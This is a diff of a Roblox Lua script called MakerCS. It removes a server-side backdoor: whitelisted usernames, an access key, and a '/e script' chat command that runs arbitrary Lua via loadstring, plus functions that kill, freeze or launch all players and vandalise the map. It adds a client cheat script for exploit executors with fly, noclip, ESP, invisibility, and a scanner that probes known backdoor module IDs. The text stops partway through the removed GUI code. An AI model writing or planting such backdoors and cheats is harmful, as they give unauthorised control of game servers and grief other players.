@@ -1,688 +1,1022 @@
--- MakerCS - Complete Backdoor System
--- Place this in ServerScriptService
+-- MakerCS - Universal Executor Script
+-- Auto-detects executor, mobile-friendly, works on any executor
+
+-- Detect executor
+local executor = "Unknown"
+local isMobile = false
+local currentGame = game.Name or "Unknown"
+local placeId = game.PlaceId or 0
+
+-- Executor detection
+local function detectExecutor()
+    if syn then executor = "Synapse X" 
+    elseif krnl then executor = "Krnl" 
+    elseif scriptware then executor = "ScriptWare" 
+    elseif fluxus then executor = "Fluxus" 
+    elseif electron then executor = "Electron" 
+    elseif delta then executor = "Delta" 
+    elseif arceus then executor = "Arceus X" 
+    elseif hydrogen then executor = "Hydrogen" 
+    elseif vega then executor = "Vega X" 
+    elseif valyse then executor = "Valyse" 
+    elseif oxygen then executor = "Oxygen U" 
+    elseif kiwi then executor = "Kiwi X" 
+    elseif comet then executor = "Comet" 
+    elseif swift then executor = "Swift" 
+    elseif nihon then executor = "Nihon" 
+    elseif athena then executor = "Athena" 
+    elseif solara then executor = "Solara" 
+    end
+    
+    if game:GetService("UserInputService").TouchEnabled then
+        isMobile = true
+    end
+    
+    local success, name = pcall(function()
+        return getexecutorname()
+    end)
+    if success and name and name ~= "" then
+        executor = name
+    end
+end
+
+detectExecutor()
+
+-- Safe notification function
+local function notify(msg, duration)
+    duration = duration or 3
+    pcall(function()
+        if syn and syn.notify then
+            syn.notify(msg, duration)
+        elseif notify then
+            notify(msg, duration)
+        else
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "MakerCS [" .. executor .. "]",
+                Text = msg,
+                Duration = duration
+            })
+        end
+    end)
+    print("[MakerCS] " .. msg)
+end
+
+-- Wait for game load
+repeat task.wait() until game:IsLoaded()
 
 local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
+local UIS = game:GetService("UserInputService")
+local RS = game:GetService("RunService")
 local Lighting = game:GetService("Lighting")
+local SG = game:GetService("StarterGui")
+local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ServerScriptService = game:GetService("ServerScriptService")
 local ServerStorage = game:GetService("ServerStorage")
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
-local Chat = game:GetService("Chat")
 
--- ============ BACKDOOR SYSTEM ============
-local Access = {
-    "ThatOneScripter1234",  -- Your username
-    -- Add more authorized users below
+local plr = Players.LocalPlayer
+local char = plr.Character or plr.CharacterAdded:Wait()
+local hum = char:WaitForChild("Humanoid")
+local root = char:WaitForChild("HumanoidRootPart")
+
+local flying = false
+local noclipping = false
+local espOn = false
+local invisible = false
+local discoOn = false
+local flySpeed = 50
+local cons = {}
+local esps = {}
+
+-- Character respawn handler
+plr.CharacterAdded:Connect(function(newChar)
+    char = newChar
+    hum = char:WaitForChild("Humanoid")
+    root = char:WaitForChild("HumanoidRootPart")
+    task.wait(0.5)
+    
+    if noclipping then
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") then
+                pcall(function() part.CanCollide = false end)
+            end
+        end
+    end
+    
+    if invisible then
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") or part:IsA("MeshPart") then
+                pcall(function() part.Transparency = 1 end)
+            end
+        end
+    end
+end)
+
+-- Create GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "MakerCS"
+gui.ResetOnSpawn = false
+gui.Parent = plr:WaitForChild("PlayerGui")
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+if isMobile then
+    mainFrame.Size = UDim2.new(0, 350, 0, 520)
+    mainFrame.Position = UDim2.new(0.5, -175, 0.5, -260)
+else
+    mainFrame.Size = UDim2.new(0, 320, 0, 500)
+    mainFrame.Position = UDim2.new(0.5, -160, 0.5, -250)
+end
+mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,30)
+mainFrame.BackgroundTransparency = 0.05
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = gui
+Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+
+-- Title Bar
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1,0,0,50)
+titleBar.BackgroundColor3 = Color3.fromRGB(0,120,200)
+titleBar.Parent = mainFrame
+Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 12)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,-60,1,0)
+title.Position = UDim2.new(0,10,0,0)
+title.BackgroundTransparency = 1
+title.Text = "MakerCS"
+title.TextColor3 = Color3.new(1,1,1)
+title.TextScaled = true
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Font = Enum.Font.GothamBold
+title.Parent = titleBar
+
+local execLabel = Instance.new("TextLabel")
+execLabel.Size = UDim2.new(0,100,0,18)
+execLabel.Position = UDim2.new(1,-110,0,5)
+execLabel.BackgroundTransparency = 1
+execLabel.Text = executor
+execLabel.TextColor3 = Color3.fromRGB(100,255,100)
+execLabel.TextScaled = true
+execLabel.Font = Enum.Font.Gotham
+execLabel.Parent = titleBar
+
+local gameLabel = Instance.new("TextLabel")
+gameLabel.Size = UDim2.new(1,0,0,18)
+gameLabel.Position = UDim2.new(0,10,0,30)
+gameLabel.BackgroundTransparency = 1
+gameLabel.Text = game.Name .. " (ID: " .. placeId .. ")"
+gameLabel.TextColor3 = Color3.fromRGB(200,200,200)
+gameLabel.TextScaled = true
+gameLabel.TextXAlignment = Enum.TextXAlignment.Left
+gameLabel.Font = Enum.Font.Gotham
+gameLabel.Parent = titleBar
+
+-- Minimize Button
+local minBtn = Instance.new("TextButton")
+minBtn.Size = UDim2.new(0,35,0,35)
+minBtn.Position = UDim2.new(1,-40,0,8)
+minBtn.BackgroundColor3 = Color3.fromRGB(200,50,50)
+minBtn.Text = "✕"
+minBtn.TextColor3 = Color3.new(1,1,1)
+minBtn.TextScaled = true
+minBtn.Font = Enum.Font.GothamBold
+minBtn.Parent = titleBar
+Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 8)
+
+-- Tab Bar
+local tabBar = Instance.new("Frame")
+tabBar.Size = UDim2.new(1,0,0,40)
+tabBar.Position = UDim2.new(0,0,0,50)
+tabBar.BackgroundColor3 = Color3.fromRGB(30,30,45)
+tabBar.Parent = mainFrame
+Instance.new("UICorner", tabBar).CornerRadius = UDim.new(0, 0)
+
+-- Tabs
+local tabs = {
+    {name = "Main", color = Color3.fromRGB(0,120,200)},
+    {name = "Client Scripts", color = Color3.fromRGB(45,45,65)},
+    {name = "SS Scripts", color = Color3.fromRGB(65,45,45)},
+    {name = "Executor", color = Color3.fromRGB(45,55,65)}
 }
 
-local ACCESS_KEY = "TeamMonster"
+local tabButtons = {}
+local contentFrames = {}
 
--- Function to check if player has access via key
-local function hasKeyAccess(player)
-    local keyFolder = ReplicatedStorage:FindFirstChild(ACCESS_KEY)
-    if keyFolder then
-        return true
-    end
-    if player.Name:find(ACCESS_KEY) then
-        return true
-    end
-    return false
+for i, tab in ipairs(tabs) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0.25, 0, 1, 0)
+    btn.Position = UDim2.new((i-1) * 0.25, 0, 0, 0)
+    btn.BackgroundColor3 = tab.color
+    btn.Text = tab.name
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.TextScaled = true
+    btn.Font = Enum.Font.GothamBold
+    btn.Parent = tabBar
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 0)
+    tabButtons[tab.name] = btn
+    
+    local content = Instance.new("ScrollingFrame")
+    content.Size = UDim2.new(1,0,1,-95)
+    content.Position = UDim2.new(0,0,0,95)
+    content.BackgroundTransparency = 1
+    content.Visible = (i == 1)
+    content.CanvasSize = UDim2.new(0,0,0,0)
+    content.ScrollBarThickness = isMobile and 8 or 6
+    content.Parent = mainFrame
+    
+    local layout = Instance.new("UIListLayout")
+    layout.Parent = content
+    layout.Padding = UDim.new(0, 8)
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+    
+    contentFrames[tab.name] = content
 end
 
--- Function to check if player is authorized
-local function isAuthorized(player)
-    for i = 1, #Access do
-        if player.Name == Access[i] then
-            return true
-        end
+-- Create button function
+local function createButton(parent, text, callback, color)
+    local btn = Instance.new("TextButton")
+    if isMobile then
+        btn.Size = UDim2.new(0.94, 0, 0, 55)
+        btn.Position = UDim2.new(0.03, 0, 0, 0)
+    else
+        btn.Size = UDim2.new(0.94, 0, 0, 45)
+        btn.Position = UDim2.new(0.03, 0, 0, 0)
     end
-    if hasKeyAccess(player) then
-        return true
-    end
-    return false
-end
-
--- Send notification to player
-function player:SendNotification(message, title)
-    title = title or "MakerCS"
-    pcall(function()
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = title,
-            Text = message,
-            Duration = 4
-        })
+    btn.BackgroundColor3 = color or Color3.fromRGB(45,45,65)
+    btn.BackgroundTransparency = 0.1
+    btn.Text = text
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.TextScaled = true
+    btn.Font = Enum.Font.GothamSemibold
+    btn.Parent = parent
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
+    
+    btn.MouseButton1Click:Connect(function()
+        pcall(callback)
     end)
-end
-
--- Loadstring function with safety
-local function loadstringSafe(code, env)
-    local success, func = pcall(function()
-        return loadstring(code)
-    end)
-    if success and func then
-        if env then
-            setfenv(func, env)
-        end
-        return func
+    
+    if isMobile then
+        btn.TouchTap:Connect(function()
+            pcall(callback)
+        end)
     end
-    return nil
+    return btn
 end
 
--- Chat command handler
-local function handleChat(message, player)
-    local split = {}
-    for word in message:gmatch("%S+") do
-        table.insert(split, word)
+-- ============ SCAN GAME FUNCTION ============
+local scanResults = {}
+local scanFrame = nil
+local scanText = nil
+
+local function scanGame()
+    notify("🔍 Scanning game... This may take a moment")
+    scanResults = {}
+    
+    -- Create scan results window
+    local scanGui = Instance.new("ScreenGui")
+    scanGui.Name = "ScanResults"
+    scanGui.Parent = plr.PlayerGui
+    
+    local scanMainFrame = Instance.new("Frame")
+    scanMainFrame.Size = UDim2.new(0, 400, 0, 500)
+    scanMainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
+    scanMainFrame.BackgroundColor3 = Color3.fromRGB(15,15,25)
+    scanMainFrame.Parent = scanGui
+    Instance.new("UICorner", scanMainFrame).CornerRadius = UDim.new(0, 12)
+    
+    local scanTitle = Instance.new("TextLabel")
+    scanTitle.Size = UDim2.new(1,0,0,40)
+    scanTitle.BackgroundColor3 = Color3.fromRGB(0,100,200)
+    scanTitle.Text = "🔍 Game Scanner Results"
+    scanTitle.TextColor3 = Color3.new(1,1,1)
+    scanTitle.TextScaled = true
+    scanTitle.Font = Enum.Font.GothamBold
+    scanTitle.Parent = scanMainFrame
+    Instance.new("UICorner", scanTitle).CornerRadius = UDim.new(0, 12)
+    
+    local closeBtn = Instance.new("TextButton")
+    closeBtn.Size = UDim2.new(0,30,0,30)
+    closeBtn.Position = UDim2.new(1,-35,0,5)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(200,50,50)
+    closeBtn.Text = "✕"
+    closeBtn.TextColor3 = Color3.new(1,1,1)
+    closeBtn.TextScaled = true
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.Parent = scanTitle
+    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 8)
+    
+    local scanContent = Instance.new("ScrollingFrame")
+    scanContent.Size = UDim2.new(1,0,1,-45)
+    scanContent.Position = UDim2.new(0,0,0,45)
+    scanContent.BackgroundTransparency = 1
+    scanContent.CanvasSize = UDim2.new(0,0,0,0)
+    scanContent.ScrollBarThickness = 6
+    scanContent.Parent = scanMainFrame
+    
+    local scanLayout = Instance.new("UIListLayout")
+    scanLayout.Parent = scanContent
+    scanLayout.Padding = UDim.new(0, 5)
+    scanLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    
+    local function addScanResult(category, name, value)
+        local resultFrame = Instance.new("Frame")
+        resultFrame.Size = UDim2.new(0.96, 0, 0, 40)
+        resultFrame.BackgroundColor3 = Color3.fromRGB(30,30,45)
+        resultFrame.Parent = scanContent
+        Instance.new("UICorner", resultFrame).CornerRadius = UDim.new(0, 8)
+        
+        local catLabel = Instance.new("TextLabel")
+        catLabel.Size = UDim2.new(0.3, 0, 1, 0)
+        catLabel.Position = UDim2.new(0.02, 0, 0, 0)
+        catLabel.BackgroundTransparency = 1
+        catLabel.Text = category
+        catLabel.TextColor3 = Color3.fromRGB(100,200,255)
+        catLabel.TextScaled = true
+        catLabel.Font = Enum.Font.GothamBold
+        catLabel.Parent = resultFrame
+        
+        local nameLabel = Instance.new("TextLabel")
+        nameLabel.Size = UDim2.new(0.35, 0, 1, 0)
+        nameLabel.Position = UDim2.new(0.33, 0, 0, 0)
+        nameLabel.BackgroundTransparency = 1
+        nameLabel.Text = name
+        nameLabel.TextColor3 = Color3.fromRGB(255,255,100)
+        nameLabel.TextScaled = true
+        nameLabel.Font = Enum.Font.Gotham
+        nameLabel.Parent = resultFrame
+        
+        local valueLabel = Instance.new("TextLabel")
+        valueLabel.Size = UDim2.new(0.28, 0, 1, 0)
+        valueLabel.Position = UDim2.new(0.69, 0, 0, 0)
+        valueLabel.BackgroundTransparency = 1
+        valueLabel.Text = tostring(value)
+        valueLabel.TextColor3 = Color3.fromRGB(100,255,100)
+        valueLabel.TextScaled = true
+        valueLabel.Font = Enum.Font.Gotham
+        valueLabel.Parent = resultFrame
     end
     
-    if #split >= 1 and split[1]:lower() == "/e" then
-        if #split >= 2 and split[2]:lower() == "script" then
-            local scriptCode = message:sub(11)
-            if scriptCode and scriptCode ~= "" then
-                local env = setmetatable({owner = player}, {
-                    __index = function(self, v)
-                        return rawget(self, v) or getfenv()[v]
-                    end,
-                    __newindex = function(self, i, v)
-                        getfenv()[i] = v
-                    end,
-                    __metatable = nil
-                })
-                local func = loadstringSafe(scriptCode, env)
-                if func then
-                    local success, err = pcall(func)
-                    if not success then
-                        player:SendNotification("❌ Script error: " .. tostring(err), "Backdoor")
-                    else
-                        player:SendNotification("✅ Script executed!", "Backdoor")
-                    end
-                else
-                    player:SendNotification("❌ Failed to load script", "Backdoor")
+    -- Scan Workspace
+    local workspaceCount = 0
+    for _, child in pairs(Workspace:GetChildren()) do
+        workspaceCount = workspaceCount + 1
+    end
+    addScanResult("📦 Workspace", "Total Objects", workspaceCount)
+    
+    -- Scan Players
+    addScanResult("👥 Players", "Total Players", #Players:GetPlayers())
+    local playerNames = ""
+    for i, p in pairs(Players:GetPlayers()) do
+        if i <= 5 then
+            playerNames = playerNames .. p.Name .. (i < #Players:GetPlayers() and i < 5 and ", " or "")
+        end
+    end
+    if #Players:GetPlayers() > 5 then
+        playerNames = playerNames .. " +" .. (#Players:GetPlayers() - 5) .. " more"
+    end
+    addScanResult("👥 Players", "Names", playerNames)
+    
+    -- Scan ReplicatedStorage
+    local remoteEvents = 0
+    local remoteFunctions = 0
+    local scripts = 0
+    for _, child in pairs(ReplicatedStorage:GetChildren()) do
+        if child:IsA("RemoteEvent") then remoteEvents = remoteEvents + 1
+        elseif child:IsA("RemoteFunction") then remoteFunctions = remoteFunctions + 1
+        elseif child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then scripts = scripts + 1
+        end
+    end
+    addScanResult("📡 ReplicatedStorage", "RemoteEvents", remoteEvents)
+    addScanResult("📡 ReplicatedStorage", "RemoteFunctions", remoteFunctions)
+    addScanResult("📡 ReplicatedStorage", "Scripts/Modules", scripts)
+    
+    -- Scan Lighting
+    addScanResult("💡 Lighting", "ClockTime", math.floor(Lighting.ClockTime))
+    addScanResult("💡 Lighting", "Brightness", math.floor(Lighting.Brightness))
+    addScanResult("💡 Lighting", "FogEnd", math.floor(Lighting.FogEnd))
+    
+    -- Detect backdoor indicators
+    local backdoorIndicators = {}
+    local backdoorIDs = {7192763922, 7116428237, 5813836873, 5282751219, 4867426485, 7001260635, 15581949972, 9230060018, 7411835387, 8222129769, 11505758587, 16857604287, 114451231828363}
+    for _, id in pairs(backdoorIDs) do
+        local success = pcall(function() return require(id) end)
+        if success then
+            table.insert(backdoorIndicators, tostring(id))
+        end
+    end
+    addScanResult("🔓 Backdoor Check", "Require IDs Found", #backdoorIndicators)
+    if #backdoorIndicators > 0 then
+        addScanResult("🔓 Backdoor IDs", "IDs", table.concat(backdoorIndicators, ", "))
+    end
+    
+    -- Scan for admin scripts
+    local adminIndicators = {"Admin", "ESP", "Fly", "Noclip", "Infinite", "Yield", "CMD", "Command"}
+    local foundAdmin = {}
+    local services = {Workspace, ReplicatedStorage, Lighting}
+    for _, service in pairs(services) do
+        for _, child in pairs(service:GetChildren()) do
+            for _, indicator in pairs(adminIndicators) do
+                if child.Name:find(indicator) then
+                    table.insert(foundAdmin, child.Name)
+                    break
                 end
             end
-        elseif #split >= 2 and split[2]:lower() == "key" then
-            if #split >= 3 and split[3] == ACCESS_KEY then
-                local keyFolder = Instance.new("Folder")
-                keyFolder.Name = ACCESS_KEY
-                keyFolder.Parent = ReplicatedStorage
-                player:SendNotification("✅ Key accepted! You now have access.", "Backdoor")
-            else
-                player:SendNotification("❌ Invalid key! Access denied.", "Backdoor")
-            end
-        elseif #split >= 2 and split[2]:lower() == "help" then
-            player:SendNotification("Commands:\n/e script [code] - Execute Lua\n/e key [key] - Verify key\n/e help - This menu", "Backdoor")
         end
     end
-end
-
--- ============ SERVERSIDE FEATURES ============
--- Command cooldowns
-local cooldowns = {}
-
-local function onCooldown(player, command)
-    local key = player.Name .. "_" .. command
-    if cooldowns[key] and os.time() - cooldowns[key] < 3 then
-        player:SendNotification("⚠️ Command on cooldown! Wait 3 seconds.", "MakerCS")
-        return true
+    addScanResult("🛡️ Admin Scripts", "Found", #foundAdmin)
+    if #foundAdmin > 0 then
+        addScanResult("🛡️ Admin Scripts", "Names", table.concat(foundAdmin, ", "))
     end
-    cooldowns[key] = os.time()
-    return false
-end
-
-local function broadcastMessage(message)
-    for _, player in pairs(Players:GetPlayers()) do
-        player:SendNotification(message, "🌐 SERVER")
-    end
-end
-
--- Flood System
-local floodActive = false
-local floodParts = {}
-local floodConnection = nil
-
-local function toggleFlood()
-    if floodActive then
-        for _, part in pairs(floodParts) do
-            pcall(function() part:Destroy() end)
+    
+    -- Update canvas size
+    task.wait(0.1)
+    local totalHeight = 0
+    for _, child in pairs(scanContent:GetChildren()) do
+        if child:IsA("Frame") then
+            totalHeight = totalHeight + 45
         end
-        floodParts = {}
-        if floodConnection then floodConnection:Disconnect() end
-        floodActive = false
-        broadcastMessage("🌊 The flood has receded!")
+    end
+    scanContent.CanvasSize = UDim2.new(0, 0, 0, totalHeight + 20)
+    
+    closeBtn.MouseButton1Click:Connect(function()
+        scanGui:Destroy()
+    end)
+    
+    notify("✅ Scan complete! Found " .. (#Players:GetPlayers()) .. " players, " .. remoteEvents .. " RemoteEvents, " .. #backdoorIndicators .. " backdoor IDs")
+end
+
+-- ============ FLY ============
+local function toggleFly()
+    if not root then
+        notify("Wait for character to load!")
         return
     end
-    
-    floodActive = true
-    local waterLevel = -50
-    
-    for x = -250, 250, 50 do
-        for z = -250, 250, 50 do
-            local water = Instance.new("Part")
-            water.Size = Vector3.new(50, 1, 50)
-            water.Position = Vector3.new(x, waterLevel, z)
-            water.Material = Enum.Material.Water
-            water.Color = Color3.fromRGB(0, 100, 255)
-            water.Transparency = 0.4
-            water.Anchored = true
-            water.CanCollide = false
-            water.Name = "FloodWater"
-            water.Parent = Workspace
-            table.insert(floodParts, water)
-        end
-    end
-    
-    local targetLevel = 300
-    local elapsed = 0
-    
-    floodConnection = RunService.Heartbeat:Connect(function(dt)
-        if not floodActive then return end
-        elapsed = elapsed + dt
-        local t = math.min(elapsed / 25, 1)
-        local currentLevel = waterLevel + (targetLevel - waterLevel) * t
-        for _, water in pairs(floodParts) do
-            if water and water.Parent then
-                water.Position = Vector3.new(water.Position.X, currentLevel, water.Position.Z)
+    flying = not flying
+    if flying then
+        local bv = Instance.new("BodyVelocity")
+        local bg = Instance.new("BodyGyro")
+        bv.MaxForce = Vector3.new(9e9,9e9,9e9)
+        bg.MaxTorque = Vector3.new(9e9,9e9,9e9)
+        bv.Parent = root
+        bg.Parent = root
+        
+        local con = RS.RenderStepped:Connect(function()
+            if not flying or not root then return end
+            local cam = workspace.CurrentCamera
+            local dir = Vector3.new()
+            
+            if isMobile then
+                local moveVec = hum.MoveDirection
+                if moveVec.Magnitude > 0.1 then
+                    dir = (cam.CFrame.RightVector * moveVec.X) + (cam.CFrame.LookVector * -moveVec.Z)
+                    dir = dir.Unit
+                end
+                if UIS:IsKeyDown(Enum.KeyCode.Space) or UIS:IsKeyDown(Enum.KeyCode.ButtonA) then
+                    dir = dir + Vector3.new(0, 1, 0)
+                end
+                if UIS:IsKeyDown(Enum.KeyCode.LeftControl) or UIS:IsKeyDown(Enum.KeyCode.ButtonR2) then
+                    dir = dir + Vector3.new(0, -1, 0)
+                end
+            else
+                if UIS:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
+                if UIS:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
+                if UIS:IsKeyDown(Enum.KeyCode.A) then dir = dir - cam.CFrame.RightVector end
+                if UIS:IsKeyDown(Enum.KeyCode.D) then dir = dir + cam.CFrame.RightVector end
+                if UIS:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
+                if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then dir = dir + Vector3.new(0, -1, 0) end
+            end
+            
+            if dir.Magnitude > 0 then
+                bv.Velocity = dir.Unit * flySpeed
+            else
+                bv.Velocity = Vector3.new()
+            end
+            bg.CFrame = cam.CFrame
+        end)
+        table.insert(cons, con)
+        notify("✈️ Fly ON")
+    else
+        for _, v in pairs(root:GetChildren()) do
+            if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then
+                v:Destroy()
             end
         end
-    end)
-    broadcastMessage("🌊 A MASSIVE FLOOD is rising! Get to high ground!")
+        notify("✈️ Fly OFF")
+    end
 end
 
--- Map Effects
-local function makeMapLava()
-    for _, part in ipairs(Workspace:GetDescendants()) do
-        if part:IsA("BasePart") and not part:IsA("Terrain") and part.Name ~= "HumanoidRootPart" then
-            part.Material = Enum.Material.Neon
-            part.Color = Color3.fromRGB(255, 50, 0)
+-- ============ NOCLIP ============
+local function toggleNoclip()
+    noclipping = not noclipping
+    notify(noclipping and "🚪 Noclip ON" or "🚪 Noclip OFF")
+end
+
+local noclipCon = RS.Stepped:Connect(function()
+    if noclipping and char then
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") then
+                pcall(function() part.CanCollide = false end)
+            end
         end
     end
-    broadcastMessage("🔥 The ENTIRE MAP has turned into LAVA!")
-end
+end)
+table.insert(cons, noclipCon)
 
-local function freezeMap()
-    for _, part in ipairs(Workspace:GetDescendants()) do
-        if part:IsA("BasePart") and not part:IsA("Terrain") then
-            part.Material = Enum.Material.Ice
-            part.Color = Color3.fromRGB(100, 200, 255)
+-- ============ ESP ============
+local function updateESP()
+    if not espOn then return end
+    
+    for _, p in pairs(Players:GetPlayers()) do
+        if p ~= plr and p.Character and p.Character:FindFirstChild("Head") then
+            local exists = false
+            for _, bg in pairs(esps) do
+                if bg.Adornee == p.Character.Head then
+                    exists = true
+                    break
+                end
+            end
+            if not exists then
+                local bg = Instance.new("BillboardGui")
+                bg.Adornee = p.Character.Head
+                bg.Size = UDim2.new(4, 0, 2, 0)
+                bg.AlwaysOnTop = true
+                bg.Parent = gui
+                
+                local tl = Instance.new("TextLabel")
+                tl.Size = UDim2.new(1, 0, 1, 0)
+                tl.BackgroundTransparency = 1
+                tl.Text = p.Name .. "\n❤️ " .. math.floor(p.Character.Humanoid.Health)
+                tl.TextColor3 = Color3.new(1, 0.2, 0.2)
+                tl.TextScaled = true
+                tl.Font = Enum.Font.GothamBold
+                tl.Parent = bg
+                table.insert(esps, bg)
+            end
         end
     end
-    broadcastMessage("❄️ The map has FROZEN OVER!")
 end
 
--- Rainbow Map
-local rainbowActive = false
-local rainbowConnection = nil
-
-local function toggleRainbowMap()
-    rainbowActive = not rainbowActive
-    if rainbowActive then
-        rainbowConnection = RunService.Heartbeat:Connect(function()
-            if not rainbowActive then return end
-            local hue = tick() % 5 / 5
-            for _, part in ipairs(Workspace:GetDescendants()) do
-                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
-                    part.Color = Color3.fromHSV(hue, 1, 1)
+local function toggleESP()
+    espOn = not espOn
+    if espOn then
+        updateESP()
+        
+        Players.PlayerAdded:Connect(function() task.wait(1) updateESP() end)
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= plr then
+                p.CharacterAdded:Connect(function() task.wait(1) updateESP() end)
+            end
+        end
+        
+        local healthLoop = RS.Heartbeat:Connect(function()
+            if espOn then
+                for _, bg in pairs(esps) do
+                    if bg and bg.Adornee and bg.Adornee.Parent then
+                        local char = bg.Adornee.Parent
+                        if char and char:FindFirstChild("Humanoid") then
+                            local tl = bg:FindFirstChild("TextLabel")
+                            if tl then
+                                tl.Text = char.Name .. "\n❤️ " .. math.floor(char.Humanoid.Health)
+                            end
+                        end
+                    end
                 end
             end
         end)
-        broadcastMessage("🌈 The map is now RAINBOW colored!")
+        table.insert(cons, healthLoop)
+        
+        notify("👁️ ESP ON")
     else
-        if rainbowConnection then rainbowConnection:Disconnect() end
-        broadcastMessage("🌈 Rainbow mode disabled!")
-    end
-end
-
--- Player Controls
-local function killAllPlayers(executor)
-    for _, target in pairs(Players:GetPlayers()) do
-        if target ~= executor and target.Character and target.Character:FindFirstChild("Humanoid") then
-            target.Character.Humanoid.Health = 0
+        for _, v in pairs(esps) do
+            pcall(function() v:Destroy() end)
         end
+        esps = {}
+        notify("👁️ ESP OFF")
     end
-    broadcastMessage("💀 " .. executor.Name .. " killed ALL other players!")
 end
 
-local function launchAllPlayers(executor)
-    for _, target in pairs(Players:GetPlayers()) do
-        if target ~= executor and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-            target.Character.HumanoidRootPart.Velocity = Vector3.new(0, 500, 0)
+-- ============ INVISIBLE ============
+local function toggleInvisible()
+    if not char then
+        notify("Wait for character!")
+        return
+    end
+    invisible = not invisible
+    if invisible then
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") or part:IsA("MeshPart") then
+                pcall(function() part.Transparency = 1 end)
+            end
         end
-    end
-    broadcastMessage("🚀 " .. executor.Name .. " launched ALL players into the air!")
-end
-
-local function freezeAllPlayers(executor)
-    for _, target in pairs(Players:GetPlayers()) do
-        if target ~= executor and target.Character and target.Character:FindFirstChild("Humanoid") then
-            target.Character.Humanoid.WalkSpeed = 0
-            target.Character.Humanoid.JumpPower = 0
+        notify("👻 Invisible ON")
+    else
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") or part:IsA("MeshPart") then
+                pcall(function() part.Transparency = 0 end)
+            end
         end
+        notify("👻 Invisible OFF")
     end
-    broadcastMessage("🛑 " .. executor.Name .. " froze ALL players!")
 end
 
-local function unfreezeAllPlayers()
-    for _, target in pairs(Players:GetPlayers()) do
-        if target.Character and target.Character:FindFirstChild("Humanoid") then
-            target.Character.Humanoid.WalkSpeed = 16
-            target.Character.Humanoid.JumpPower = 50
-        end
-    end
-    broadcastMessage("💨 All players unfrozen!")
-end
-
--- Lighting Effects
-local function blackout()
-    Lighting.Brightness = 0
-    Lighting.ClockTime = 0
-    broadcastMessage("🌑 A BLACKOUT has occurred!")
-end
-
-local function restoreLighting()
-    Lighting.Brightness = 2
-    Lighting.ClockTime = 14
-    Lighting.Ambient = Color3.fromRGB(127, 127, 127)
-    broadcastMessage("☀️ Lighting has been restored!")
-end
-
-local function shockwave()
-    local explosion = Instance.new("Explosion")
-    explosion.Position = Vector3.new(0, 0, 0)
-    explosion.BlastRadius = 500
-    explosion.BlastPressure = 1000000
-    explosion.Parent = Workspace
-    broadcastMessage("💥 A MASSIVE SHOCKWAVE rocked the map!")
-end
-
-local function lightningStrike()
-    for i = 1, 10 do
-        local x = math.random(-200, 200)
-        local z = math.random(-200, 200)
-        local lightning = Instance.new("Part")
-        lightning.Size = Vector3.new(2, 100, 2)
-        lightning.Position = Vector3.new(x, 50, z)
-        lightning.Material = Enum.Material.Neon
-        lightning.Color = Color3.fromRGB(255, 255, 0)
-        lightning.Anchored = true
-        lightning.CanCollide = false
-        lightning.Parent = Workspace
-        
-        local explosion = Instance.new("Explosion")
-        explosion.Position = Vector3.new(x, 0, z)
-        explosion.BlastRadius = 20
-        explosion.Parent = Workspace
-        
-        task.wait(0.1)
-        lightning:Destroy()
-    end
-    broadcastMessage("⚡ LIGHTNING STRIKES hit the map!")
-end
-
--- ============ GUI SYSTEM ============
-local function createGUI(player)
-    if not isAuthorized(player) then return end
-    
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "MakerCS"
-    gui.ResetOnSpawn = false
-    gui.Parent = player.PlayerGui
-    
-    local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 450, 0, 550)
-    mainFrame.Position = UDim2.new(0.5, -225, 0.5, -275)
-    mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
-    mainFrame.Active = true
-    mainFrame.Draggable = true
-    mainFrame.Parent = gui
-    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)
-    
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1,0,0,40)
-    title.BackgroundColor3 = Color3.fromRGB(0,100,200)
-    title.Text = "MakerCS [Backdoor]"
-    title.TextColor3 = Color3.new(1,1,1)
-    title.TextScaled = true
-    title.Font = Enum.Font.GothamBold
-    title.Parent = mainFrame
